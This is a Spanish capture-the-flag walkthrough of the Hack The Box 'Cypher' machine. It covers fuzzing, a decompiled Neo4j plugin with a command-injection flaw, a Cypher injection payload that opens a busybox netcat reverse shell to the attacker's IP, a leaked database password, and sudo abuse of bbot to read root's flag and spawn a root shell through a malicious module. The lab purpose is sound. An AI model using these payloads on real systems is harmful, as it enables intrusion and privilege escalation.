# Nmap ports (TCP sCV)

| Puerto   | Servicio | Versión                                                                 |
|----------|----------|-------------------------------------------------------------------------|
| 22/tcp   | ssh      | OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)           |
| 80/tcp   | http     | nginx 1.24.0 (Ubuntu)                                                   |
# Puerto 80 
![[Pasted image 20250305182419.png]]

--- 
## Fuzzing

```bash
200      GET       63l      139w     1548c http://cypher.htb/utils.js
200      GET        3l      113w     8123c http://cypher.htb/bootstrap-notify.min.js
200      GET      126l      274w     3671c http://cypher.htb/login
200      GET      179l      477w     4986c http://cypher.htb/about
307      GET        0l        0w        0c http://cypher.htb/demo => http://cypher.htb/login
307      GET        0l        0w        0c http://cypher.htb/api => http://cypher.htb/api/docs
307      GET        0l        0w        0c http://cypher.htb/api/ => http://cypher.htb/api/api
405      GET        1l        3w       31c http://cypher.htb/api/auth
200      GET        2l     1293w    89664c http://cypher.htb/jquery-3.6.1.min.js
200      GET       12l     2173w   195855c http://cypher.htb/bootstrap.min.css
200      GET        7l     1223w    80496c http://cypher.htb/bootstrap.bundle.min.js
200      GET      162l      360w     4562c http://cypher.htb/index
200      GET     7333l    24018w   208204c http://cypher.htb/vivagraph.min.js
301      GET        7l       12w      178c http://cypher.htb/testing => http://cypher.htb/testing/
200      GET      876l     4886w   373109c http://cypher.htb/logo.png
200      GET      162l      360w     4562c http://cypher.htb/
200      GET       17l      139w     9977c http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
404      GET        1l        2w       22c http://cypher.htb/demos
200      GET     5632l    33572w  2776750c http://cypher.htb/us.png

```

En el endpoint `/testing` nos encontramos una Index:

![[Pasted image 20250305182637.png]]
Es un archivo .jar vamos a diseccionarlo para ello vamos a usar la herramienta [jadx_gui](https://github.com/wlcaption/jadx_gui)

![[Pasted image 20250305184500.png]]

En el código descubrimos una extensión personalizada para Neo4j, un sistema de base de datos orientado a grafos.
El jar se compone de dos Clases :
### HelloWorldProcedure
```java
package com.cypher.neo4j.apoc;  
  
import java.util.stream.Stream;  
import org.neo4j.procedure.Description;  
import org.neo4j.procedure.Mode;  
import org.neo4j.procedure.Name;  
import org.neo4j.procedure.Procedure;  
  
/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/HelloWorldProcedure.class */  
public class HelloWorldProcedure {  
    @Procedure(name = "custom.helloWorld", mode = Mode.READ)  
    @Description("A simple hello world procedure")  
    public Stream<HelloWorldOutput> helloWorld(@Name("name") String name) {  
        String greeting = "Hello, " + name + "!";  
        return Stream.of(new HelloWorldOutput(greeting));  
    }  
  
    /* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class */  
    public static class HelloWorldOutput {  
        public String greeting;  
  
        public HelloWorldOutput(String greeting) {  
            this.greeting = greeting;  
        }  
    }  
}
```
### [[CustomFunctions]]

La clase `CustomFunctions` define un procedimiento personalizado (`@Procedure`) llamado `custom.getUrlStatusCode`. Este procedimiento tiene como objetivo devolver el código de estado HTTP de una URL proporcionada.
```java
package com.cypher.neo4j.apoc;  
  
import java.io.BufferedReader;  
import java.io.InputStreamReader;  
import java.util.Arrays;  
import java.util.concurrent.TimeUnit;  
import java.util.stream.Stream;  
import org.neo4j.procedure.Description;  
import org.neo4j.procedure.Mode;  
import org.neo4j.procedure.Name;  
import org.neo4j.procedure.Procedure;  
  
/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions.class */  
public class CustomFunctions {  
    @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)  
    @Description("Returns the HTTP status code for the given URL as a string")  
    public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {  
        if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {  
            url = "https://" + url;  
        }  
        String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};  
        System.out.println("Command: " + Arrays.toString(command));  
        Process process = Runtime.getRuntime().exec(command);  
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));  
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));  
        StringBuilder errorOutput = new StringBuilder();  
        while (true) {  
            String line = errorReader.readLine();  
            if (line == null) {  
                break;  
            }  
            errorOutput.append(line).append("\n");  
        }  
        String statusCode = inputReader.readLine();  
        System.out.println("Status code: " + statusCode);  
        boolean exited = process.waitFor(10L, TimeUnit.SECONDS);  
        if (!exited) {  
            process.destroyForcibly();  
            statusCode = "0";  
            System.err.println("Process timed out after 10 seconds");  
        } else {  
            int exitCode = process.exitValue();  
            if (exitCode != 0) {  
                statusCode = "0";  
                System.err.println("Process exited with code " + exitCode);  
            }  
        }  
        if (errorOutput.length() > 0) {  
            System.err.println("Error output:\n" + errorOutput.toString());  
        }  
        return Stream.of(new StringOutput(statusCode));  
    }  
  
    /* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class */  
    public static class StringOutput {  
        public String statusCode;  
  
        public StringOutput(String statusCode) {  
            this.statusCode = statusCode;  
        }  
    }  
}
```
- **Ejecución de comandos arbitrarios** :  
    La función utiliza `Runtime.exec()` para ejecutar un comando `curl` en el sistema operativo subyacente. Esto puede ser vulnerable si no se sanitizan adecuadamente las entradas. Por ejemplo:
    
    - Si la variable `url` no se valida correctamente, podría permitir inyección de comandos.

# Neo4j
En el codigo observamos la version de neo4j , dentro de META-INF en el pom.xml
```java
<project xmlns="http://maven.apache.org/POM/4.0.0"  
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">  
    <modelVersion>4.0.0</modelVersion>  
  
    <groupId>com.cypher.neo4j</groupId>  
    <artifactId>custom-apoc-extension</artifactId>  
    <version>1.0-SNAPSHOT</version>  
  
    <properties>  
        <neo4j.version>5.23.0</neo4j.version>  
        <maven.compiler.source>11</maven.compiler.source>  
        <maven.compiler.target>11</maven.compiler.target>  
   
...
```

Neo4j funciona bajo consultas `cypher` ; que hacen llamadas a neo4j; a diferencia de SQL, que está diseñado para bases de datos relacionales, Cypher se centra en la manipulación y el análisis de datos estructurados en forma de grafos, donde los nodos representan entidades y las relaciones (o aristas) representan conexiones entre ellas.
# RCE
Podemos triggerear el curl en endpoint `/login` de la pagina de cypher

El codigo para explotar el RCE se ve tal que asi 
```cypher
a' return h.value as a UNION CALL custom.getUrlStatusCode("example.com;<payload>;#") YIELD statusCode AS a RETURN a;//
```

El payload comienza cerrando el contexto de cadena existente en la consulta Cypher con una `'`. Esto efectivamente termina la estructura de la consulta prevista, permitiendo al atacante adjuntar su código malicioso.

**Primera cláusula RETURN (RETURN h.value AS a):**  
Este segmento intenta devolver el valor de `h.value` alias como `a`. Si `h` no está definido, esta parte podría no producir salida significativa, pero sirve para alinear la estructura de la consulta para el subsiguiente `UNION`.

**Cláusula UNION:**  
El operador `UNION` combina los resultados de dos consultas. En este contexto, fusiona el resultado de la consulta benigna con el malicioso, facilitando la ejecución del código del atacante.

**Llamada al procedimiento custom.getUrlStatusCode(...):**  
Este procedimiento personalizado se explota para realizar una solicitud HTTP y luego un comando aprovechando el codigo del .jar . La URL proporcionada incluye una inyección de comandos:  
`http://10.10.x.x:8000;busybox nc 10.10.14.195 443 -e sh;#`  
Aquí, el punto y coma (`;`) permite la ejecución de múltiples comandos. Después de intentar acceder a `http://10.10.x.x:8000/`, se ejecuta `busybox nc 10.10.14.195 443 -e sh`, lo cual inicia una conexión de shell inversa hacia la máquina del atacante.

**Cláusulas YIELD y RETURN finales:**  
`YIELD statusCode AS a` captura el código de estado HTTP desde la llamada a `getUrlStatusCode`, alias como `a`. El subsiguiente `RETURN a` devuelve este código de estado. Aunque el código de estado en sí mismo podría ser de interés limitado, estas cláusulas aseguran que la consulta se ejecute sin errores de sintaxis, facilitando el objetivo principal de **rce**.


para mas info acerca de la explotacion y de los comandos cyphers podemos consultar [Cypher commands y RCE en cypher](obsidian://open?vault=HTB&file=Machines%2FCypher%2FCypher%20commands%20y%20RCE%20en%20cypher)

--- 

## POC

```bash
a' return h.value as a UNION CALL custom.getUrlStatusCode("http://10.10.14.167:8000;busybox nc 10.10.14.167 2323 -e sh;#") YIELD statusCode AS a RETURN a;// 
```
![[Pasted image 20250306122642.png]]

Una vez establecida una rev shell con `busybox` encontramos credenciales del usuario graphasm en el siguiente path:

`/home/graphasm/bbot_scans`

```cypher
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```
![[Pasted image 20250306115911.png]]

### sudo -l 
```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot

```

Podemos usar como sudo el binario `bbot` vamos a analizarlo 

www.blacklanternsecurity.com/bbot

```python
graphasm@cypher:~$ /usr/local/bin/bbot
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[INFO] Creating BBOT config at /home/graphasm/.config/bbot/bbot.yml
[INFO] Creating BBOT secrets at /home/graphasm/.config/bbot/secrets.yml
usage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]]
            [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo]
            [-em MODULE [MODULE ...]] [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]]
            [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset]
            [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]] [--json] [--brief]
```
**BBOT (Better Business Operating Tool)** es una herramienta de **OSINT (Open-Source Intelligence)** de código abierto diseñada para automatizar la recolección de información y el análisis de datos públicos. Fue desarrollada originalmente por la empresa de ciberseguridad **Rapid7** y se enfoca en facilitar la investigación de amenazas, el análisis de redes y la identificación de vulnerabilidades.

Vemos que corre en el sistema bajo la versión 2.1.0.4939

### FILE READ
Podemos leer archivos con la herramienta de bbot corriendola como sudo , los parametros son los siguientes:
	  -c [CONFIG ...], --config [CONFIG ...]
                        Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'
Para leer un archivo de configuracion ; en nuestro caso le pasaremos el archivo `/root/root.txt`
	  -d, --debug           Enable debugging
a modo de "verbose" de esta forma nos muestra por pantalla el contenido del archivo
	-y, --yes             Skip scan confirmation prompt
Para saltarnos el prompt de confirmacion forzando al programa a actuar

 El comando quedaria de la siguiente manera
```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d
```

Por consola nos promptea la flag de root
```bash
[DBUG] internal.excavate: Final combined yara rule contents: 80fc93baa918264...
```


## SHELL


A continuación dejo varios documentos del binario que me han ayudado a entender bien como funciona para poder llegar a invocar una shell; 

[https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/#yaml-config-vs-command-line](https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/#yaml-config-vs-command-line "https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/#yaml-config-vs-command-line") 
[https://www.blacklanternsecurity.com/bbot/Stable/scanning/advanced/](https://www.blacklanternsecurity.com/bbot/Stable/scanning/advanced/ "https://www.blacklanternsecurity.com/bbot/Stable/scanning/advanced/") 

Podemos invocar una shell con `bbot` cargando un custom module : [https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/ "https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/")


> [! Load Modules from Custom Locations]
> 
> If you have a custom module and you want to use it with BBOT, you can add its parent folder to `module_dirs`. This saves you from having to copy it into the BBOT install location. To add a custom module directory, add it to `module_dirs` in your preset:
> 


### POC

para obtener la  shell creamos un preset en el home directory y anadimos el path donde vamos a situar el module que nos permita invocar una shell de root;

**preset.yml:**
```
# load BBOT modules from these additional paths
module_dirs:
  - /home/graphasm/CustomModules
```

Creamos un module dentro del path indicado en el preset; se hace en python importando las librerias de bbot


**module.py:**
```python
from bbot.modules.base import BaseModule
import os

class vaina(BaseModule):
        os.system("/bin/bash -p")

```

Ahora solo queda ejecutar el binario indicando el preset y el modulo a cargar
```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -p ./preset.yml -m module
```
![[Pasted image 20250306172750.png]]

[^1]: 
